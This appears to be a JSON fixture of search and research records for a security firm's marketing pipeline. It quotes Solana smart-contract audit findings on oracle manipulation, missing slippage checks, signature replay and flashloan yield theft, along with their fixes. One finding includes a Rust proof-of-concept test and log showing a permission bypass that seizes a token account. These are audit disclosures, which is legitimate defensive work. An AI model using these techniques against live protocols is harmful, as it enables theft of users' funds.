@@ -1,0 +1,593 @@
+[
+  {
+    "record_id": "thread_1/research_search/1/1",
+    "slot_id": "thread_1",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "SS-03738",
+        "kind": "kb",
+        "url": null,
+        "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+        "retrieved_at": "2026-10-23T22:53:58.700661Z",
+        "published_at": null,
+        "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03740",
+        "kind": "kb",
+        "url": null,
+        "title": "Swap Instruction Lacks Slippage Protection",
+        "retrieved_at": "2026-10-23T22:53:58.701918Z",
+        "published_at": null,
+        "evidence_text": "Swap Instruction Lacks Slippage Protection\nWe found that the **swap instruction** depends on several invariants to calculate fair exchange rates:\n\n- Current oracle prices ( `sol_usd_pyth_feed` )\n\n- Current token supplies ( `levercoin_mint.supply` )\n\n- Current protocol state (e.g., total SOL, collateral ratio)\n\nThis makes it **vulnerable to frontrunning attacks** . Currently, there is **no slippage protection mechanism** to guard against this.\nAdd a **slippage check** to the swap instruction so that the user specifies a minimum acceptable output. If the actual result falls below this bound, the transaction should revert.",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03706",
+        "kind": "kb",
+        "url": null,
+        "title": "`secp256k1` Is Vulnerable to Signature Malleability and Replay Attacks",
+        "retrieved_at": "2026-10-23T22:53:58.703958Z",
+        "published_at": null,
+        "evidence_text": "`secp256k1` Is Vulnerable to Signature Malleability and Replay Attacks\nWe found that the `secp256k1_authenticate` implementation is vulnerable to two issues:\n\n1. **Replay Attack**: The signature is not enforced to be single-use, allowing the same signature to be reused multiple times for authorization, this could lead to unauthorized repeated operations.\n\n2. **Signature Malleability**: The implementation does not enforce that the `S` value of the signature is in low-order form. This allows alternative valid signatures for the same message, making it possible to modify a signature without invalidating it. This undermines signature uniqueness and opens the door to replay in different contexts or manipulation of signed payloads. See [Solana SDK secp256k1\\_recover - Signature Malleability](https://docs.rs/solchainsaw/latest/sol_chainsaw/solana_sdk/secp256k1_recover/fn.secp256k1_recover.html#signature-malleability) for reference.\n\u2022 **Prevent Replay Attacks**: Introduce a mechanism (e.g. nonce tracking, on-chain replay protection) to ensure each signature is accepted only once. \u2022 **Prevent Signature Malleability**: Reject signatures where the `S` component is not in low-order",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03699",
+        "kind": "kb",
+        "url": null,
+        "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+        "retrieved_at": "2026-10-23T22:53:58.709726Z",
+        "published_at": null,
+        "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03703",
+        "kind": "kb",
+        "url": null,
+        "title": "`sub_account_sign_v1` and `sign_v1` Passes Session Authorities as Signers During CPI Calls",
+        "retrieved_at": "2026-10-23T22:53:58.711441Z",
+        "published_at": null,
+        "evidence_text": "`sub_account_sign_v1` and `sign_v1` Passes Session Authorities as Signers During CPI Calls\nWe found that in `sub_account_sign_v1` and `sign_v1`, session-based authorities are not added to the `restricted_keys` list. As a result, these accounts are mistakenly passed as signers in downstream CPI calls, which can unintentionally grant them authority.\nUpdate the logic to correctly restrict signers based on the authority type. Only `Secp256k1` doesn't have the authority. All other authority types must include both the payer and the session authority:\n\n```\nlet rkeys: &[&Pubkey] = unsafe {\n    if role.position.authority_type()? == AuthorityType::Secp256k1 {\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 1)\n    } else {\n        let authority_index = *sign_v1.authority_payload.get_unchecked(0) as usize;\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        restricted_keys[1].write(all_accounts[authority_index].key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 2)\n    }\n};\n```",
+        "status": "ok"
+      }
+    ],
+    "action": "search_kb",
+    "query": "oracle manipulation",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_1/research/1/1",
+    "slot_id": "thread_1",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_1",
+      "topic_id": "SS-03738",
+      "topic_name": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+      "sources": [
+        {
+          "source_id": "SS-03738",
+          "kind": "kb",
+          "url": null,
+          "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+          "retrieved_at": "2026-10-23T22:53:58.700661Z",
+          "published_at": null,
+          "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03738",
+        "kind": "kb",
+        "url": null,
+        "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+        "retrieved_at": "2026-10-23T22:53:58.700661Z",
+        "published_at": null,
+        "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_2/research/1/1",
+    "slot_id": "thread_2",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_2",
+      "topic_id": "SS-03793",
+      "topic_name": "Launch Signer not checked on initialization",
+      "sources": [
+        {
+          "source_id": "SS-03793",
+          "kind": "kb",
+          "url": null,
+          "title": "Launch Signer not checked on initialization",
+          "retrieved_at": "2026-10-23T22:54:07.808159Z",
+          "published_at": null,
+          "evidence_text": "Launch Signer not checked on initialization\nIn the `InitializeLaunch` instruction, the `launch_signer` account is passed as an Unchecked account, but in the constraints it is asserted that it is the authority of the given `usdc_vault`, `token_vault`, and the mint authority. The handler then derives the key for the launch signer itself, and writes the derived key into the launch state account, without checking that the derivation matches the provided key in the accounts. At the end of the function, the token program is called to mint tokens using the unchecked launch signer from the accounts, and the launch signer seeds are passed as a signer. If an attacker signs this transaction using their fake launch signer, this signature will also be passed and the call to the token program will succeed. This means an attacker can create a fake launch signer account and the corresponding mint and token vault accounts, and call the initialization instruction, signing as the launch signer. Later on, they could potentially reassign the owner of the token accounts and the mint authority to the correct launch signer, so that the launchpad program works without any disturbances - however before that they will be able to mint arbitrary tokens, or withdraw from the treasuries.\nCheck the launch signer seeds in the constraints instead of the handler.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03793",
+        "kind": "kb",
+        "url": null,
+        "title": "Launch Signer not checked on initialization",
+        "retrieved_at": "2026-10-23T22:54:07.808159Z",
+        "published_at": null,
+        "evidence_text": "Launch Signer not checked on initialization\nIn the `InitializeLaunch` instruction, the `launch_signer` account is passed as an Unchecked account, but in the constraints it is asserted that it is the authority of the given `usdc_vault`, `token_vault`, and the mint authority. The handler then derives the key for the launch signer itself, and writes the derived key into the launch state account, without checking that the derivation matches the provided key in the accounts. At the end of the function, the token program is called to mint tokens using the unchecked launch signer from the accounts, and the launch signer seeds are passed as a signer. If an attacker signs this transaction using their fake launch signer, this signature will also be passed and the call to the token program will succeed. This means an attacker can create a fake launch signer account and the corresponding mint and token vault accounts, and call the initialization instruction, signing as the launch signer. Later on, they could potentially reassign the owner of the token accounts and the mint authority to the correct launch signer, so that the launchpad program works without any disturbances - however before that they will be able to mint arbitrary tokens, or withdraw from the treasuries.\nCheck the launch signer seeds in the constraints instead of the handler.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_3/research/1/1",
+    "slot_id": "thread_3",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_3",
+      "topic_id": "SS-03926",
+      "topic_name": "Lack of fees allow flashloan yield-stealing attack",
+      "sources": [
+        {
+          "source_id": "SS-03926",
+          "kind": "kb",
+          "url": null,
+          "title": "Lack of fees allow flashloan yield-stealing attack",
+          "retrieved_at": "2026-10-23T22:54:07.836775Z",
+          "published_at": null,
+          "evidence_text": "Lack of fees allow flashloan yield-stealing attack\nWe found that the lack of deposit/withdraw fees allow an attacker to deposit funds whenever rev or iss has accumulated hasn't been processed yet, call the processing functions, and then immediately withdraw again, earning a yield without contributing to the yield (their funds were never staked). Together with a flashloan, an attacker could steal most of the generated yield for themselves.\nA simple fix could be a fee charged on deposits or withdraws. We could also make rev/iss processing an admin instruction, but it could still be vulnerable to sandwiching. We could also move yield processing, or add checks on deposits that there is no unprocessed yield.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03926",
+        "kind": "kb",
+        "url": null,
+        "title": "Lack of fees allow flashloan yield-stealing attack",
+        "retrieved_at": "2026-10-23T22:54:07.836775Z",
+        "published_at": null,
+        "evidence_text": "Lack of fees allow flashloan yield-stealing attack\nWe found that the lack of deposit/withdraw fees allow an attacker to deposit funds whenever rev or iss has accumulated hasn't been processed yet, call the processing functions, and then immediately withdraw again, earning a yield without contributing to the yield (their funds were never staked). Together with a flashloan, an attacker could steal most of the generated yield for themselves.\nA simple fix could be a fee charged on deposits or withdraws. We could also make rev/iss processing an admin instruction, but it could still be vulnerable to sandwiching. We could also move yield processing, or add checks on deposits that there is no unprocessed yield.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_1/research_search/1/1",
+    "slot_id": "marketing_1",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-e4498adceb1abd45",
+        "kind": "web",
+        "url": "https://owasp.org/www-community/attacks/Software_Supply_Chain_Attack",
+        "title": "OWASP: Software supply chain attacks",
+        "retrieved_at": "2026-10-23T22:54:07.874777Z",
+        "published_at": null,
+        "evidence_text": "OWASP describes how compromised dependencies and build systems can affect applications that trust them. Reviews should include the dependency and CI/CD paths around an application.",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "supply chain key compromise losses",
+    "query_attempts": [
+      {
+        "query": "supply chain key compromise losses",
+        "service_line": "pentesting",
+        "backend": "fixture",
+        "result_count": 1
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://owasp.org/www-community/attacks/Software_Supply_Chain_Attack",
+        "final_url": "https://owasp.org/www-community/attacks/Software_Supply_Chain_Attack",
+        "service_line": "pentesting",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_1/research/1/1",
+    "slot_id": "marketing_1",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_1",
+      "topic_id": "ANGLE-pentesting",
+      "topic_name": "web2-pentesting",
+      "sources": [
+        {
+          "source_id": "WEB-e4498adceb1abd45",
+          "kind": "web",
+          "url": "https://owasp.org/www-community/attacks/Software_Supply_Chain_Attack",
+          "title": "OWASP: Software supply chain attacks",
+          "retrieved_at": "2026-10-23T22:54:07.874777Z",
+          "published_at": null,
+          "evidence_text": "OWASP describes how compromised dependencies and build systems can affect applications that trust them. Reviews should include the dependency and CI/CD paths around an application.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-02",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:09.088875Z",
+          "published_at": null,
+          "evidence_text": "SanadSquad provides Web2 pentesting for the infrastructure around a protocol: APIs, cloud, CI/CD, dependencies, internal access, and frontend.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-05",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:09.088886Z",
+          "published_at": null,
+          "evidence_text": "Teams can request a SanadSquad review.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-e4498adceb1abd45",
+        "kind": "web",
+        "url": "https://owasp.org/www-community/attacks/Software_Supply_Chain_Attack",
+        "title": "OWASP: Software supply chain attacks",
+        "retrieved_at": "2026-10-23T22:54:07.874777Z",
+        "published_at": null,
+        "evidence_text": "OWASP describes how compromised dependencies and build systems can affect applications that trust them. Reviews should include the dependency and CI/CD paths around an application.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-02",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:09.088875Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides Web2 pentesting for the infrastructure around a protocol: APIs, cloud, CI/CD, dependencies, internal access, and frontend.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:09.088886Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a SanadSquad review.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_2/research_search/1/1",
+    "slot_id": "marketing_2",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-430c5292e08d1720",
+        "kind": "web",
+        "url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
+        "title": "OWASP GenAI: Prompt injection",
+        "retrieved_at": "2026-10-23T22:54:07.878396Z",
+        "published_at": null,
+        "evidence_text": "OWASP documents prompt injection as untrusted input that can change an AI system's instructions. Agent tools with authority should enforce policy outside the model output before signing or taking action.",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "prompt injection agent signing tools",
+    "query_attempts": [
+      {
+        "query": "prompt injection agent signing tools",
+        "service_line": "agentic-security",
+        "backend": "fixture",
+        "result_count": 1
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
+        "final_url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_2/research/1/1",
+    "slot_id": "marketing_2",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_2",
+      "topic_id": "ANGLE-agentic-security",
+      "topic_name": "agentic-security-and-red-teaming",
+      "sources": [
+        {
+          "source_id": "WEB-430c5292e08d1720",
+          "kind": "web",
+          "url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
+          "title": "OWASP GenAI: Prompt injection",
+          "retrieved_at": "2026-10-23T22:54:07.878396Z",
+          "published_at": null,
+          "evidence_text": "OWASP documents prompt injection as untrusted input that can change an AI system's instructions. Agent tools with authority should enforce policy outside the model output before signing or taking action.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-03",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:09.760078Z",
+          "published_at": null,
+          "evidence_text": "SanadSquad provides agentic security and red teaming for AI agent systems, including prompt injection, tool abuse, unauthorized action, agent wallets, and spending policy.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-05",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:09.760086Z",
+          "published_at": null,
+          "evidence_text": "Teams can request a SanadSquad review.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-430c5292e08d1720",
+        "kind": "web",
+        "url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
+        "title": "OWASP GenAI: Prompt injection",
+        "retrieved_at": "2026-10-23T22:54:07.878396Z",
+        "published_at": null,
+        "evidence_text": "OWASP documents prompt injection as untrusted input that can change an AI system's instructions. Agent tools with authority should enforce policy outside the model output before signing or taking action.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-03",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:09.760078Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides agentic security and red teaming for AI agent systems, including prompt injection, tool abuse, unauthorized action, agent wallets, and spending policy.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:09.760086Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a SanadSquad review.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research_search/1/1",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-6f68894cae341dc2",
+        "kind": "web",
+        "url": "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable",
+        "title": "OpenZeppelin: Writing upgradeable contracts",
+        "retrieved_at": "2026-10-23T22:54:07.881035Z",
+        "published_at": null,
+        "evidence_text": "OpenZeppelin documentation explains that deployed contract code has constraints that differ from development code. Security review should account for initialization and upgrade paths before deployment.",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "web3 security audits deployed-code drift",
+    "query_attempts": [
+      {
+        "query": "web3 security audits deployed-code drift",
+        "service_line": "web3-security",
+        "backend": "fixture",
+        "result_count": 1
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable",
+        "final_url": "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research_search/1/2",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [],
+    "action": "web_search",
+    "query": "smart contract security beyond the contract: infrastructure, access control, oracle manipulation root causes OWASP Smart Contract Top 10",
+    "query_attempts": [
+      {
+        "query": "smart contract security beyond the contract: infrastructure, access control, oracle manipulation root causes OWASP Smart Contract Top 10",
+        "service_line": "web3-security",
+        "backend": "fixture",
+        "result_count": 0
+      }
+    ],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research_search/1/3",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [],
+    "action": "web_search",
+    "query": "SWC Registry reentrancy SWC-107 root cause mitigation checks-effects-interactions",
+    "query_attempts": [
+      {
+        "query": "SWC Registry reentrancy SWC-107 root cause mitigation checks-effects-interactions",
+        "service_line": "web3-security",
+        "backend": "fixture",
+        "result_count": 0
+      }
+    ],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research_search/1/4",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [],
+    "action": "web_search",
+    "query": "smart contract security beyond the contract: access control, oracle manipulation, key management, and infrastructure compromise root causes OWASP Smart Contract Top 10",
+    "query_attempts": [
+      {
+        "query": "smart contract security beyond the contract: access control, oracle manipulation, key management, and infrastructure compromise root causes OWASP Smart Contract Top 10",
+        "service_line": "web3-security",
+        "backend": "fixture",
+        "result_count": 0
+      }
+    ],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research/1/1",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_3",
+      "topic_id": "ANGLE-web3-security",
+      "topic_name": "web3-security",
+      "sources": [
+        {
+          "source_id": "WEB-6f68894cae341dc2",
+          "kind": "web",
+          "url": "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable",
+          "title": "OpenZeppelin: Writing upgradeable contracts",
+          "retrieved_at": "2026-10-23T22:54:07.881035Z",
+          "published_at": null,
+          "evidence_text": "OpenZeppelin documentation explains that deployed contract code has constraints that differ from development code. Security review should account for initialization and upgrade paths before deployment.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-01",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:15.559134Z",
+          "published_at": null,
+          "evidence_text": "SanadSquad provides smart contract audits across EVM and Solana/SVM.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-05",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-23T22:54:15.559144Z",
+          "published_at": null,
+          "evidence_text": "Teams can request a SanadSquad review.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-6f68894cae341dc2",
+        "kind": "web",
+        "url": "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable",
+        "title": "OpenZeppelin: Writing upgradeable contracts",
+        "retrieved_at": "2026-10-23T22:54:07.881035Z",
+        "published_at": null,
+        "evidence_text": "OpenZeppelin documentation explains that deployed contract code has constraints that differ from development code. Security review should account for initialization and upgrade paths before deployment.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-01",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:15.559134Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides smart contract audits across EVM and Solana/SVM.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-23T22:54:15.559144Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a SanadSquad review.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  }
+]
